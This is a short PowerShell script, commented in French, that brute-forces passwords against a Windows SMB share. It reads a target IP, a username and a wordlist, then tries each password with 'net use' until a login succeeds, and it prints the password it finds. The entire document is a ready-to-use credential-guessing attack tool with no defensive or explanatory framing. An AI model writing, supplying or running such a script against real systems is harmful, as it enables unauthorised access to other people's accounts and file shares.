# Demander l'adresse IP, le nom d'utilisateur et le chemin de la liste de mots de passe
$ip = Read-Host "Enter IP Address"
$username = Read-Host "Enter Username"
$wordlist = Read-Host "Enter path to the Password list"

# Lire tous les mots de passe de la wordlist
$passwords = Get-Content $wordlist

# Compteur d'essais
$count = 1

# Fonction pour tester les mots de passe
function Test-Password {
    param ($password)

    # Tenter d'accéder au partage SMB
    $result = net use "\\$ip" /user:$username $password 2>&1

    # Vérifier si l'accès est réussi
    if ($LASTEXITCODE -eq 0) {
        Write-Host "`nPassword found: $password"
        net use "\\$ip" /delete > $null 2>&1  # Fermer la connexion
        return $true
    } else {
        Write-Host "[ATTEMPT $count] [$password] - Failed"
        return $false
    }
}

# Boucle pour tester chaque mot de passe dans la liste
foreach ($password in $passwords) {
    if (Test-Password $password) {
        break  # Arrêter la boucle si le bon mot de passe est trouvé
    }
    $count++
}

if ($LASTEXITCODE -ne 0) {
    Write-Host "`nPassword not found :/"
}

Pause